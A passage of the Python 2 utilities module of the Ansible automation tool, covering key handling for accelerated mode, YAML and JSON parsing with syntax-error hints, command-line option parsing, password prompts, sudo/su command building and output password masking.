except ImportError:\n        PowmInsecureWarning = RuntimeWarning\n\n    with warnings.catch_warnings(record=True) as warning_handler:\n        warnings.simplefilter(\"error\", PowmInsecureWarning)\n        try:\n            import keyczar.errors as key_errors\n            from keyczar.keys import AesKey\n        except PowmInsecureWarning:\n            system_warning(\n                \"The version of gmp you have installed has a known issue regarding \" + \\\n                \"timing vulnerabilities when used with pycrypto. \" + \\\n                \"If possible, you should update it (ie. yum update gmp).\"\n            )\n            warnings.resetwarnings()\n            warnings.simplefilter(\"ignore\")\n            import keyczar.errors as key_errors\n            from keyczar.keys import AesKey\n        KEYCZAR_AVAILABLE=True\nexcept ImportError:\n    pass\n\n###############################################################\n# Abstractions around keyczar\n###############################################################\n\ndef key_for_hostname(hostname):\n    # fireball mode is an implementation of ansible firing up zeromq via SSH\n    # to use no persistent daemons or key management\n\n    if not KEYCZAR_AVAILABLE:\n        raise errors.AnsibleError(\"python-keyczar must be installed on the control machine to use accelerated modes\")\n\n    key_path = os.path.expanduser(C.ACCELERATE_KEYS_DIR)\n    if not os.path.exists(key_path):\n        os.makedirs(key_path, mode=0700)\n        os.chmod(key_path, int(C.ACCELERATE_KEYS_DIR_PERMS, 8))\n    elif not os.path.isdir(key_path):\n        raise errors.AnsibleError('ACCELERATE_KEYS_DIR is not a directory.')\n\n    if stat.S_IMODE(os.stat(key_path).st_mode) != int(C.ACCELERATE_KEYS_DIR_PERMS, 8):\n        raise errors.AnsibleError('Incorrect permissions on the private key directory. Use `chmod 0%o %s` to correct this issue, and make sure any of the keys files contained within that directory are set to 0%o' % (int(C.ACCELERATE_KEYS_DIR_PERMS, 8), C.ACCELERATE_KEYS_DIR, int(C.ACCELERATE_KEYS_FILE_PERMS, 8)))\n\n    key_path = os.path.join(key_path, hostname)\n\n    # use new AES keys every 2 hours, which means fireball must not allow running for longer either\n    if not os.path.exists(key_path) or (time.time() - os.path.getmtime(key_path) > 60*60*2):\n        key = AesKey.Generate()\n        fd = os.open(key_path, os.O_WRONLY | os.O_CREAT, int(C.ACCELERATE_KEYS_FILE_PERMS, 8))\n        fh = os.fdopen(fd, 'w')\n        fh.write(str(key))\n        fh.close()\n        return key\n    else:\n        if stat.S_IMODE(os.stat(key_path).st_mode) != int(C.ACCELERATE_KEYS_FILE_PERMS, 8):\n            raise errors.AnsibleError('Incorrect permissions on the key file for this host. Use `chmod 0%o %s` to correct this issue.' % (int(C.ACCELERATE_KEYS_FILE_PERMS, 8), key_path))\n        fh = open(key_path)\n        key = AesKey.Read(fh.read())\n        fh.close()\n        return key\n\ndef encrypt(key, msg):\n    return key.Encrypt(msg)\n\ndef decrypt(key, msg):\n    try:\n        return key.Decrypt(msg)\n    except key_errors.InvalidSignatureError:\n        raise errors.AnsibleError(\"decryption failed\")\n\n###############################################################\n# UTILITY FUNCTIONS FOR COMMAND LINE TOOLS\n###############################################################\n\ndef err(msg):\n    ''' print an error message to stderr '''\n\n    print >> sys.stderr, msg\n\ndef exit(msg, rc=1):\n    ''' quit with an error to stdout and a failure code '''\n\n    err(msg)\n    sys.exit(rc)\n\ndef jsonify(result, format=False):\n    ''' format JSON output (uncompressed or uncompressed) '''\n\n    if result is None:\n        return \"{}\"\n    result2 = result.copy()\n    for key, value in result2.items():\n        if type(value) is str:\n            result2[key] = value.decode('utf-8', 'ignore')\n    if format:\n        return json.dumps(result2, sort_keys=True, indent=4)\n    else:\n        return json.dumps(result2, sort_keys=True)\n\ndef write_tree_file(tree, hostname, buf):\n    ''' write something into treedir/hostname '''\n\n    # TODO: might be nice to append playbook runs per host in a similar way\n    # in which case, we'd want append mode.\n    path = os.path.join(tree, hostname)\n    fd = open(path, \"w+\")\n    fd.write(buf)\n    fd.close()\n\ndef is_failed(result):\n    ''' is a given JSON result a failed result? '''\n\n    return ((result.get('rc', 0) != 0) or (result.get('failed', False) in [ True, 'True', 'true']))\n\ndef is_changed(result):\n    ''' is a given JSON result a changed result? '''\n\n    return (result.get('changed', False) in [ True, 'True', 'true'])\n\ndef check_conditional(conditional, basedir, inject, fail_on_undefined=False):\n\n    if conditional is None or conditional == '':\n        return True\n\n    if isinstance(conditional, list):\n        for x in conditional:\n            if not check_conditional(x, basedir, inject, fail_on_undefined=fail_on_undefined):\n                return False\n        return True\n\n    if not isinstance(conditional, basestring):\n        return conditional\n\n    conditional = conditional.replace(\"jinja2_compare \",\"\")\n    # allow variable names\n    if conditional in inject and '-' not in str(inject[conditional]):\n        conditional = inject[conditional]\n    conditional = template.template(basedir, conditional, inject, fail_on_undefined=fail_on_undefined)\n    original = str(conditional).replace(\"jinja2_compare \",\"\")\n    # a Jinja2 evaluation that results in something Python can eval!\n    presented = \"{%% if %s %%} True {%% else %%} False {%% endif %%}\" % conditional\n    conditional = template.template(basedir, presented, inject)\n    val = conditional.strip()\n    if val == presented:\n        # the templating failed, meaning most likely a \n        # variable was undefined. If we happened to be \n        # looking for an undefined variable, return True,\n        # otherwise fail\n        if \"is undefined\" in conditional:\n            return True\n        elif \"is defined\" in conditional:\n            return False\n        else:\n            raise errors.AnsibleError(\"error while evaluating conditional: %s\" % original)\n    elif val == \"True\":\n        return True\n    elif val == \"False\":\n        return False\n    else:\n        raise errors.AnsibleError(\"unable to evaluate conditional: %s\" % original)\n\ndef is_executable(path):\n    '''is the given path executable?'''\n    return (stat.S_IXUSR & os.stat(path)[stat.ST_MODE]\n            or stat.S_IXGRP & os.stat(path)[stat.ST_MODE]\n            or stat.S_IXOTH & os.stat(path)[stat.ST_MODE])\n\ndef unfrackpath(path):\n    ''' \n    returns a path that is free of symlinks, environment\n    variables, relative path traversals and symbols (~)\n    example:\n    '$HOME/../../var/mail' becomes '/var/spool/mail'\n    '''\n    return os.path.normpath(os.path.realpath(os.path.expandvars(os.path.expanduser(path))))\n\ndef prepare_writeable_dir(tree,mode=0777):\n    ''' make sure a directory exists and is writeable '''\n\n    # modify the mode to ensure the owner at least\n    # has read/write access to this directory\n    mode |= 0700\n\n    # make sure the tree path is always expanded\n    # and normalized and free of symlinks\n    tree = unfrackpath(tree)\n\n    if not os.path.exists(tree):\n        try:\n            os.makedirs(tree, mode)\n        except (IOError, OSError), e:\n            raise errors.AnsibleError(\"Could not make dir %s: %s\" % (tree, e))\n    if not os.access(tree, os.W_OK):\n        raise errors.AnsibleError(\"Cannot write to path %s\" % tree)\n    return tree\n\ndef path_dwim(basedir, given):\n    '''\n    make relative paths work like folks expect.\n    '''\n\n    if given.startswith(\"/\"):\n        return os.path.abspath(given)\n    elif given.startswith(\"~\"):\n        return os.path.abspath(os.path.expanduser(given))\n    else:\n        if basedir is None:\n            basedir = \".\"\n        return os.path.abspath(os.path.join(basedir, given))\n\ndef path_dwim_relative(original, dirname, source, playbook_base, check=True):\n    ''' find one file in a directory one level up in a dir named dirname relative to current '''\n    # (used by roles code)\n\n    basedir = os.path.dirname(original)\n    if os.path.islink(basedir):\n        basedir = unfrackpath(basedir)\n        template2 = os.path.join(basedir, dirname, source)\n    else:\n        template2 = os.path.join(basedir, '..', dirname, source)\n    source2 = path_dwim(basedir, template2)\n    if os.path.exists(source2):\n        return source2\n    obvious_local_path = path_dwim(playbook_base, source)\n    if os.path.exists(obvious_local_path):\n        return obvious_local_path\n    if check:\n        raise errors.AnsibleError(\"input file not found at %s or %s\" % (source2, obvious_local_path))\n    return source2 # which does not exist\n\ndef json_loads(data):\n    ''' parse a JSON string and return a data structure '''\n\n    return json.loads(data)\n\ndef _clean_data(orig_data, from_remote=False, from_inventory=False):\n    ''' remove template tags from a string '''\n    data = orig_data\n    if isinstance(orig_data, basestring):\n        sub_list = [('{%','{#'), ('%}','#}')]\n        if from_remote or (from_inventory and '{{' in data and LOOKUP_REGEX.search(data)):\n            # if from a remote, we completely disable any jinja2 blocks\n            sub_list.extend([('{{','{#'), ('}}','#}')])\n        for pattern,replacement in sub_list:\n            data = data.replace(pattern, replacement)\n    return data\n\ndef _clean_data_struct(orig_data, from_remote=False, from_inventory=False):\n    '''\n    walk a complex data structure, and use _clean_data() to\n    remove any template tags that may exist\n    '''\n    if not from_remote and not from_inventory:\n        raise errors.AnsibleErrors(\"when cleaning data, you must specify either from_remote or from_inventory\")\n    if isinstance(orig_data, dict):\n        data = orig_data.copy()\n        for key in data:\n            new_key = _clean_data_struct(key, from_remote, from_inventory)\n            new_val = _clean_data_struct(data[key], from_remote, from_inventory)\n            if key != new_key:\n                del data[key]\n            data[new_key] = new_val\n    elif isinstance(orig_data, list):\n        data = orig_data[:]\n        for i in range(0, len(data)):\n            data[i] = _clean_data_struct(data[i], from_remote, from_inventory)\n    elif isinstance(orig_data, basestring):\n        data = _clean_data(orig_data, from_remote, from_inventory)\n    else:\n        data = orig_data\n    return data\n\ndef parse_json(raw_data, from_remote=False, from_inventory=False):\n    ''' this version for module return data only '''\n\n    orig_data = raw_data\n\n    # ignore stuff like tcgetattr spewage or other warnings\n    data = filter_leading_non_json_lines(raw_data)\n\n    try:\n        results = json.loads(data)\n    except:\n        # not JSON, but try \"Baby JSON\" which allows many of our modules to not\n        # require JSON and makes writing modules in bash much simpler\n        results = {}\n        try:\n            tokens = shlex.split(data)\n        except:\n            print \"failed to parse json: \"+ data\n            raise\n        for t in tokens:\n            if \"=\" not in t:\n                raise errors.AnsibleError(\"failed to parse: %s\" % orig_data)\n            (key,value) = t.split(\"=\", 1)\n            if key == 'changed' or 'failed':\n                if value.lower() in [ 'true', '1' ]:\n                    value = True\n                elif value.lower() in [ 'false', '0' ]:\n                    value = False\n            if key == 'rc':\n                value = int(value)\n            results[key] = value\n        if len(results.keys()) == 0:\n            return { \"failed\" : True, \"parsed\" : False, \"msg\" : orig_data }\n\n    if from_remote:\n        results = _clean_data_struct(results, from_remote, from_inventory)\n\n    return results\n\ndef merge_module_args(current_args, new_args):\n    '''\n    merges either a dictionary or string of k=v pairs with another string of k=v pairs,\n    and returns a new k=v string without duplicates.\n    '''\n    if not isinstance(current_args, basestring):\n        raise errors.AnsibleError(\"expected current_args to be a basestring\")\n    # we use parse_kv to split up the current args into a dictionary\n    final_args = parse_kv(current_args)\n    if isinstance(new_args, dict):\n        final_args.update(new_args)\n    elif isinstance(new_args, basestring):\n        new_args_kv = parse_kv(new_args)\n        final_args.update(new_args_kv)\n    # then we re-assemble into a string\n    module_args = \"\"\n    for (k,v) in final_args.iteritems():\n        if isinstance(v, basestring):\n            module_args = \"%s=%s %s\" % (k, pipes.quote(v), module_args)\n    return module_args.strip()\n\ndef smush_braces(data):\n    ''' smush Jinaj2 braces so unresolved templates like {{ foo }} don't get parsed weird by key=value code '''\n    while '{{ ' in data:\n        data = data.replace('{{ ', '{{')\n    while ' }}' in data:\n        data = data.replace(' }}', '}}')\n    return data\n\ndef smush_ds(data):\n    # things like key={{ foo }} are not handled by shlex.split well, so preprocess any YAML we load\n    # so we do not have to call smush elsewhere\n    if type(data) == list:\n        return [ smush_ds(x) for x in data ]\n    elif type(data) == dict:\n        for (k,v) in data.items():\n            data[k] = smush_ds(v)\n        return data\n    elif isinstance(data, basestring):\n        return smush_braces(data)\n    else:\n        return data\n\ndef parse_yaml(data, path_hint=None):\n    ''' convert a yaml string to a data structure.  Also supports JSON, ssssssh!!!'''\n\n    stripped_data = data.lstrip()\n    loaded = None\n    if stripped_data.startswith(\"{\") or stripped_data.startswith(\"[\"):\n        # since the line starts with { or [ we can infer this is a JSON document.\n        try:\n            loaded = json.loads(data)\n        except ValueError, ve:\n            if path_hint:\n                raise errors.AnsibleError(path_hint + \": \" + str(ve))\n            else:\n                raise errors.AnsibleError(str(ve))\n    else:\n        # else this is pretty sure to be a YAML document\n        loaded = yaml.safe_load(data)\n\n    return smush_ds(loaded)\n\ndef process_common_errors(msg, probline, column):\n    replaced = probline.replace(\" \",\"\")\n\n    if \":{{\" in replaced and \"}}\" in replaced:\n        msg = msg + \"\"\"\nThis one looks easy to fix.  YAML thought it was looking for the start of a \nhash/dictionary and was confused to see a second \"{\".  Most likely this was\nmeant to be an ansible template evaluation instead, so we have to give the \nparser a small hint that we wanted a string instead. The solution here is to \njust quote the entire value.\n\nFor instance, if the original line was:\n\n    app_path: {{ base_path }}/foo\n\nIt should be written as:\n\n    app_path: \"{{ base_path }}/foo\"\n\"\"\"\n        return msg\n\n    elif len(probline) and len(probline) > 1 and len(probline) > column and probline[column] == \":\" and probline.count(':') > 1:\n        msg = msg + \"\"\"\nThis one looks easy to fix.  There seems to be an extra unquoted colon in the line \nand this is confusing the parser. It was only expecting to find one free \ncolon. The solution is just add some quotes around the colon, or quote the \nentire line after the first colon.\n\nFor instance, if the original line was:\n\n    copy: src=file.txt dest=/path/filename:with_colon.txt\n\nIt can be written as:\n\n    copy: src=file.txt dest='/path/filename:with_colon.txt'\n\nOr:\n    \n    copy: 'src=file.txt dest=/path/filename:with_colon.txt'\n\n\n\"\"\"\n        return msg\n    else:\n        parts = probline.split(\":\")\n        if len(parts) > 1:\n            middle = parts[1].strip()\n            match = False\n            unbalanced = False\n            if middle.startswith(\"'\") and not middle.endswith(\"'\"):\n                match = True\n            elif middle.startswith('\"') and not middle.endswith('\"'):\n                match = True\n            if len(middle) > 0 and middle[0] in [ '\"', \"'\" ] and middle[-1] in [ '\"', \"'\" ] and probline.count(\"'\") > 2 or probline.count('\"') > 2:\n                unbalanced = True\n            if match:\n                msg = msg + \"\"\"\nThis one looks easy to fix.  It seems that there is a value started \nwith a quote, and the YAML parser is expecting to see the line ended \nwith the same kind of quote.  For instance:\n\n    when: \"ok\" in result.stdout\n\nCould be written as:\n\n   when: '\"ok\" in result.stdout'\n\nor equivalently:\n\n   when: \"'ok' in result.stdout\"\n\n\"\"\"\n                return msg\n\n            if unbalanced:\n                msg = msg + \"\"\"\nWe could be wrong, but this one looks like it might be an issue with \nunbalanced quotes.  If starting a value with a quote, make sure the \nline ends with the same set of quotes.  For instance this arbitrary \nexample:\n\n    foo: \"bad\" \"wolf\"\n\nCould be written as:\n\n    foo: '\"bad\" \"wolf\"'\n\n\"\"\"\n                return msg\n\n    return msg\n\ndef process_yaml_error(exc, data, path=None, show_content=True):\n    if hasattr(exc, 'problem_mark'):\n        mark = exc.problem_mark\n        if show_content:\n            if mark.line -1 >= 0:\n                before_probline = data.split(\"\\n\")[mark.line-1]\n            else:\n                before_probline = ''\n            probline = data.split(\"\\n\")[mark.line]\n            arrow = \" \" * mark.column + \"^\"\n            msg = \"\"\"Syntax Error while loading YAML script, %s\nNote: The error may actually appear before this position: line %s, column %s\n\n%s\n%s\n%s\"\"\" % (path, mark.line + 1, mark.column + 1, before_probline, probline, arrow)\n\n            unquoted_var = None\n            if '{{' in probline and '}}' in probline:\n                if '\"{{' not in probline or \"'{{\" not in probline:\n                    unquoted_var = True\n\n            msg = process_common_errors(msg, probline, mark.column)\n            if not unquoted_var:\n                msg = process_common_errors(msg, probline, mark.column)\n            else:\n                msg = msg + \"\"\"\nWe could be wrong, but this one looks like it might be an issue with\nmissing quotes.  Always quote template expression brackets when they \nstart a value. For instance:            \n\n    with_items:\n      - {{ foo }}\n\nShould be written as:\n\n    with_items:\n      - \"{{ foo }}\"      \n\n\"\"\"\n                msg = process_common_errors(msg, probline, mark.column)\n        else:\n            # most likely displaying a file with sensitive content,\n            # so don't show any of the actual lines of yaml just the\n            # line number itself\n            msg = \"\"\"Syntax error while loading YAML script, %s\nThe error appears to have been on line %s, column %s, but may actually\nbe before there depending on the exact syntax problem.\n\"\"\" % (path, mark.line + 1, mark.column + 1)\n\n    else:\n        # No problem markers means we have to throw a generic\n        # \"stuff messed up\" type message. Sry bud.\n        if path:\n            msg = \"Could not parse YAML. Check over %s again.\" % path\n        else:\n            msg = \"Could not parse YAML.\"\n    raise errors.AnsibleYAMLValidationFailed(msg)\n\n\ndef parse_yaml_from_file(path, vault_password=None):\n    ''' convert a yaml file to a data structure '''\n\n    data = None\n    show_content = True\n\n    try:\n        data = open(path).read()\n    except IOError:\n        raise errors.AnsibleError(\"file could not read: %s\" % path)\n\n    vault = VaultLib(password=vault_password)\n    if vault.is_encrypted(data):\n        data = vault.decrypt(data)\n        show_content = False\n\n    try:\n        return parse_yaml(data, path_hint=path)\n    except yaml.YAMLError, exc:\n        process_yaml_error(exc, data, path, show_content)\n\ndef parse_kv(args):\n    ''' convert a string of key/value items to a dict '''\n    options = {}\n    if args is not None:\n        # attempting to split a unicode here does bad things\n        args = args.encode('utf-8')\n        try:\n            vargs = shlex.split(args, posix=True)\n        except ValueError, ve:\n            if 'no closing quotation' in str(ve).lower():\n                raise errors.AnsibleError(\"error parsing argument string, try quoting the entire line.\")\n            else:\n                raise\n        vargs = [x.decode('utf-8') for x in vargs]\n        for x in vargs:\n            if \"=\" in x:\n                k, v = x.split(\"=\",1)\n                options[k] = v\n    return options\n\ndef merge_hash(a, b):\n    ''' recursively merges hash b into a\n    keys from b take precedence over keys from a '''\n\n    result = copy.deepcopy(a)\n\n    # next, iterate over b keys and values\n    for k, v in b.iteritems():\n        # if there's already such key in a\n        # and that key contains dict\n        if k in result and isinstance(result[k], dict):\n            # merge those dicts recursively\n            result[k] = merge_hash(a[k], v)\n        else:\n            # otherwise, just copy a value from b to a\n            result[k] = v\n\n    return result\n\ndef md5s(data):\n    ''' Return MD5 hex digest of data. '''\n\n    digest = _md5()\n    try:\n        digest.update(data)\n    except UnicodeEncodeError:\n        digest.update(data.encode('utf-8'))\n    return digest.hexdigest()\n\ndef md5(filename):\n    ''' Return MD5 hex digest of local file, or None if file is not present. '''\n\n    if not os.path.exists(filename):\n        return None\n    digest = _md5()\n    blocksize = 64 * 1024\n    try:\n        infile = open(filename, 'rb')\n        block = infile.read(blocksize)\n        while block:\n            digest.update(block)\n            block = infile.read(blocksize)\n        infile.close()\n    except IOError, e:\n        raise errors.AnsibleError(\"error while accessing the file %s, error was: %s\" % (filename, e))\n    return digest.hexdigest()\n\ndef default(value, function):\n    ''' syntactic sugar around lazy evaluation of defaults '''\n    if value is None:\n        return function()\n    return value\n\ndef _gitinfo():\n    ''' returns a string containing git branch, commit id and commit date '''\n    result = None\n    repo_path = os.path.join(os.path.dirname(__file__), '..', '..', '..', '.git')\n\n    if os.path.exists(repo_path):\n        # Check if the .git is a file. If it is a file, it means that we are in a submodule structure.\n        if os.path.isfile(repo_path):\n            try:\n                gitdir = yaml.safe_load(open(repo_path)).get('gitdir')\n                # There is a posibility the .git file to have an absolute path.\n                if os.path.isabs(gitdir):\n                    repo_path = gitdir\n                else:\n                    repo_path = os.path.join(repo_path.split('.git')[0], gitdir)\n            except (IOError, AttributeError):\n                return ''\n        f = open(os.path.join(repo_path, \"HEAD\"))\n        branch = f.readline().split('/')[-1].rstrip(\"\\n\")\n        f.close()\n        branch_path = os.path.join(repo_path, \"refs\", \"heads\", branch)\n        if os.path.exists(branch_path):\n            f = open(branch_path)\n            commit = f.readline()[:10]\n            f.close()\n            date = time.localtime(os.stat(branch_path).st_mtime)\n            if time.daylight == 0:\n                offset = time.timezone\n            else:\n                offset = time.altzone\n            result = \"({0} {1}) last updated {2} (GMT {3:+04d})\".format(branch, commit,\n                time.strftime(\"%Y/%m/%d %H:%M:%S\", date), offset / -36)\n    else:\n        result = ''\n    return result\n\ndef version(prog):\n    result = \"{0} {1}\".format(prog, __version__)\n    gitinfo = _gitinfo()\n    if gitinfo:\n        result = result + \" {0}\".format(gitinfo)\n    return result\n\ndef getch():\n    ''' read in a single character '''\n    fd = sys.stdin.fileno()\n    old_settings = termios.tcgetattr(fd)\n    try:\n        tty.setraw(sys.stdin.fileno())\n        ch = sys.stdin.read(1)\n    finally:\n        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)\n    return ch\n\ndef sanitize_output(str):\n    ''' strips private info out of a string '''\n\n    private_keys = ['password', 'login_password']\n\n    filter_re = [\n        # filter out things like user:pass@foo/whatever\n        # and http://username:pass@wherever/foo\n        re.compile('^(?P<before>.*:)(?P<password>.*)(?P<after>\\@.*)$'),\n    ]\n\n    parts = str.split()\n    output = ''\n    for part in parts:\n        try:\n            (k,v) = part.split('=', 1)\n            if k in private_keys:\n                output += \" %s=VALUE_HIDDEN\" % k\n            else:\n                found = False\n                for filter in filter_re:\n                    m = filter.match(v)\n                    if m:\n                        d = m.groupdict()\n                        output += \" %s=%s\" % (k, d['before'] + \"********\" + d['after'])\n                        found = True\n                        break\n                if not found:\n                    output += \" %s\" % part\n        except:\n            output += \" %s\" % part\n\n    return output.strip()\n\n####################################################################\n# option handling code for /usr/bin/ansible and ansible-playbook\n# below this line\n\nclass SortedOptParser(optparse.OptionParser):\n    '''Optparser which sorts the options by opt before outputting --help'''\n\n    def format_help(self, formatter=None):\n        self.option_list.sort(key=operator.methodcaller('get_opt_string'))\n        return optparse.OptionParser.format_help(self, formatter=None)\n\ndef increment_debug(option, opt, value, parser):\n    global VERBOSITY\n    VERBOSITY += 1\n\ndef base_parser(constants=C, usage=\"\", output_opts=False, runas_opts=False,\n    async_opts=False, connect_opts=False, subset_opts=False, check_opts=False, diff_opts=False):\n    ''' create an options parser for any ansible script '''\n\n    parser = SortedOptParser(usage, version=version(\"%prog\"))\n    parser.add_option('-v','--verbose', default=False, action=\"callback\",\n        callback=increment_debug, help=\"verbose mode (-vvv for more, -vvvv to enable connection debugging)\")\n\n    parser.add_option('-f','--forks', dest='forks', default=constants.DEFAULT_FORKS, type='int',\n        help=\"specify number of parallel processes to use (default=%s)\" % constants.DEFAULT_FORKS)\n    parser.add_option('-i', '--inventory-file', dest='inventory',\n        help=\"specify inventory host file (default=%s)\" % constants.DEFAULT_HOST_LIST,\n        default=constants.DEFAULT_HOST_LIST)\n    parser.add_option('-k', '--ask-pass', default=False, dest='ask_pass', action='store_true',\n        help='ask for SSH password')\n    parser.add_option('--private-key', default=C.DEFAULT_PRIVATE_KEY_FILE, dest='private_key_file',\n        help='use this file to authenticate the connection')\n    parser.add_option('-K', '--ask-sudo-pass', default=False, dest='ask_sudo_pass', action='store_true',\n        help='ask for sudo password')\n    parser.add_option('--ask-su-pass', default=False, dest='ask_su_pass', action='store_true', \n        help='ask for su password')\n    parser.add_option('--ask-vault-pass', default=False, dest='ask_vault_pass', action='store_true', \n        help='ask for vault password')\n    parser.add_option('--vault-password-file', default=None, dest='vault_password_file',\n        help=\"vault password file\")\n    parser.add_option('--list-hosts', dest='listhosts', action='store_true',\n        help='outputs a list of matching hosts; does not execute anything else')\n    parser.add_option('-M', '--module-path', dest='module_path',\n        help=\"specify path(s) to module library (default=%s)\" % constants.DEFAULT_MODULE_PATH,\n        default=None)\n\n    if subset_opts:\n        parser.add_option('-l', '--limit', default=constants.DEFAULT_SUBSET, dest='subset',\n            help='further limit selected hosts to an additional pattern')\n\n    parser.add_option('-T', '--timeout', default=constants.DEFAULT_TIMEOUT, type='int',\n        dest='timeout',\n        help=\"override the SSH timeout in seconds (default=%s)\" % constants.DEFAULT_TIMEOUT)\n\n    if output_opts:\n        parser.add_option('-o', '--one-line', dest='one_line', action='store_true',\n            help='condense output')\n        parser.add_option('-t', '--tree', dest='tree', default=None,\n            help='log output to this directory')\n\n    if runas_opts:\n        parser.add_option(\"-s\", \"--sudo\", default=constants.DEFAULT_SUDO, action=\"store_true\",\n            dest='sudo', help=\"run operations with sudo (nopasswd)\")\n        parser.add_option('-U', '--sudo-user', dest='sudo_user', default=None,\n                          help='desired sudo user (default=root)')  # Can't default to root because we need to detect when this option was given\n        parser.add_option('-u', '--user', default=constants.DEFAULT_REMOTE_USER,\n            dest='remote_user', help='connect as this user (default=%s)' % constants.DEFAULT_REMOTE_USER)\n\n        parser.add_option('-S', '--su', default=constants.DEFAULT_SU,\n                          action='store_true', help='run operations with su')\n        parser.add_option('-R', '--su-user', help='run operations with su as this '\n                                                  'user (default=%s)' % constants.DEFAULT_SU_USER)\n\n    if connect_opts:\n        parser.add_option('-c', '--connection', dest='connection',\n                          default=C.DEFAULT_TRANSPORT,\n                          help=\"connection type to use (default=%s)\" % C.DEFAULT_TRANSPORT)\n\n    if async_opts:\n        parser.add_option('-P', '--poll', default=constants.DEFAULT_POLL_INTERVAL, type='int',\n            dest='poll_interval',\n            help=\"set the poll interval if using -B (default=%s)\" % constants.DEFAULT_POLL_INTERVAL)\n        parser.add_option('-B', '--background', dest='seconds', type='int', default=0,\n            help='run asynchronously, failing after X seconds (default=N/A)')\n\n    if check_opts:\n        parser.add_option(\"-C\", \"--check\", default=False, dest='check', action='store_true',\n            help=\"don't make any changes; instead, try to predict some of the changes that may occur\"\n        )\n\n    if diff_opts:\n        parser.add_option(\"-D\", \"--diff\", default=False, dest='diff', action='store_true',\n            help=\"when changing (small) files and templates, show the differences in those files; works great with --check\"\n        )\n\n\n    return parser\n\ndef ask_vault_passwords(ask_vault_pass=False, ask_new_vault_pass=False, confirm_vault=False, confirm_new=False):\n\n    vault_pass = None\n    new_vault_pass = None\n\n    if ask_vault_pass:\n        vault_pass = getpass.getpass(prompt=\"Vault password: \")\n\n    if ask_vault_pass and confirm_vault:\n        vault_pass2 = getpass.getpass(prompt=\"Confirm Vault password: \")\n        if vault_pass != vault_pass2:\n            raise errors.AnsibleError(\"Passwords do not match\")\n\n    if ask_new_vault_pass:\n        new_vault_pass = getpass.getpass(prompt=\"New Vault password: \")\n\n    if ask_new_vault_pass and confirm_new:\n        new_vault_pass2 = getpass.getpass(prompt=\"Confirm New Vault password: \")\n        if new_vault_pass != new_vault_pass2:\n            raise errors.AnsibleError(\"Passwords do not match\")\n\n    # enforce no newline chars at the end of passwords\n    if vault_pass:\n        vault_pass = vault_pass.strip()\n    if new_vault_pass:\n        new_vault_pass = new_vault_pass.strip()\n\n    return vault_pass, new_vault_pass\n\ndef ask_passwords(ask_pass=False, ask_sudo_pass=False, ask_su_pass=False, ask_vault_pass=False):\n    sshpass = None\n    sudopass = None\n    su_pass = None\n    vault_pass = None\n    sudo_prompt = \"sudo password: \"\n    su_prompt = \"su password: \"\n\n    if ask_pass:\n        sshpass = getpass.getpass(prompt=\"SSH password: \")\n        sudo_prompt = \"sudo password [defaults to SSH password]: \"\n\n    if ask_sudo_pass:\n        sudopass = getpass.getpass(prompt=sudo_prompt)\n        if ask_pass and sudopass == '':\n            sudopass = sshpass\n\n    if ask_su_pass:\n        su_pass = getpass.getpass(prompt=su_prompt)\n\n    if ask_vault_pass:\n        vault_pass = getpass.getpass(prompt=\"Vault password: \")\n\n    return (sshpass, sudopass, su_pass, vault_pass)\n\ndef do_encrypt(result, encrypt, salt_size=None, salt=None):\n    if PASSLIB_AVAILABLE:\n        try:\n            crypt = getattr(passlib.hash, encrypt)\n        except:\n            raise errors.AnsibleError(\"passlib does not support '%s' algorithm\" % encrypt)\n\n        if salt_size:\n            result = crypt.encrypt(result, salt_size=salt_size)\n        elif salt:\n            result = crypt.encrypt(result, salt=salt)\n        else:\n            result = crypt.encrypt(result)\n    else:\n        raise errors.AnsibleError(\"passlib must be installed to encrypt vars_prompt values\")\n\n    return result\n\ndef last_non_blank_line(buf):\n\n    all_lines = buf.splitlines()\n    all_lines.reverse()\n    for line in all_lines:\n        if (len(line) > 0):\n            return line\n    # shouldn't occur unless there's no output\n    return \"\"\n\ndef filter_leading_non_json_lines(buf):\n    '''\n    used to avoid random output from SSH at the top of JSON output, like messages from\n    tcagetattr, or where dropbear spews MOTD on every single command (which is nuts).\n\n    need to filter anything which starts not with '{', '[', ', '=' or is an empty line.\n    filter only leading lines since multiline JSON is valid.\n    '''\n\n    kv_regex = re.compile(r'.*\\w+=\\w+.*')\n    filtered_lines = StringIO.StringIO()\n    stop_filtering = False\n    for line in buf.splitlines():\n        if stop_filtering or kv_regex.match(line) or line.startswith('{') or line.startswith('['):\n            stop_filtering = True\n            filtered_lines.write(line + '\\n')\n    return filtered_lines.getvalue()\n\ndef boolean(value):\n    val = str(value)\n    if val.lower() in [ \"true\", \"t\", \"y\", \"1\", \"yes\" ]:\n        return True\n    else:\n        return False\n\ndef make_sudo_cmd(sudo_user, executable, cmd):\n    \"\"\"\n    helper function for connection plugins to create sudo commands\n    \"\"\"\n    # Rather than detect if sudo wants a password this time, -k makes\n    # sudo always ask for a password if one is required.\n    # Passing a quoted compound command to sudo (or sudo -s)\n    # directly doesn't work, so we shellquote it with pipes.quote()\n    # and pass the quoted string to the user's shell.  We loop reading\n    # output until we see the randomly-generated sudo prompt set with\n    # the -p option.\n    randbits = ''.join(chr(random.randint(ord('a'), ord('z'))) for x in xrange(32))\n    prompt = '[sudo via ansible, key=%s] password: ' % randbits\n    success_key = 'SUDO-SUCCESS-%s' % randbits\n    sudocmd = '%s -k && %s %s -S -p \"%s\" -u %s %s -c %s' % (\n        C.DEFAULT_SUDO_EXE, C.DEFAULT_SUDO_EXE, C.DEFAULT_SUDO_FLAGS,\n        prompt, sudo_user, executable or '$SHELL', pipes.quote('echo %s; %s' % (success_key, cmd)))\n    return ('/bin/sh -c ' + pipes.quote(sudocmd), prompt, success_key)\n\n\ndef make_su_cmd(su_user, executable, cmd):\n    \"\"\"\n    Helper function for connection plugins to create direct su commands\n    \"\"\"\n    # TODO: work on this function\n    randbits = ''.join(chr(random.randint(ord('a'), ord('z'))) for x in xrange(32))\n    prompt = 'assword: '\n    success_key = 'SUDO-SUCCESS-%s' % randbits\n    sudocmd = '%s %s %s %s -c %s' % (\n        C.DEFAULT_SU_EXE, C.DEFAULT_SU_FLAGS, su_user, executable or '$SHELL',\n        pipes.quote('echo %s; %s' % (success_key, cmd))\n    )\n    return ('/bin/sh -c ' + pipes.quote(sudocmd), prompt, success_key)\n\n_TO_UNICODE_TYPES = (unicode, type(None))\n\ndef to_unicode(value):\n    if isinstance(value, _TO_UNICODE_TYPES):\n        return value\n    return value.decode(\"utf-8\")\n\ndef get_diff(diff):\n    # called by --diff usage in playbook and runner via callbacks\n    # include names in diffs 'before' and 'after' and 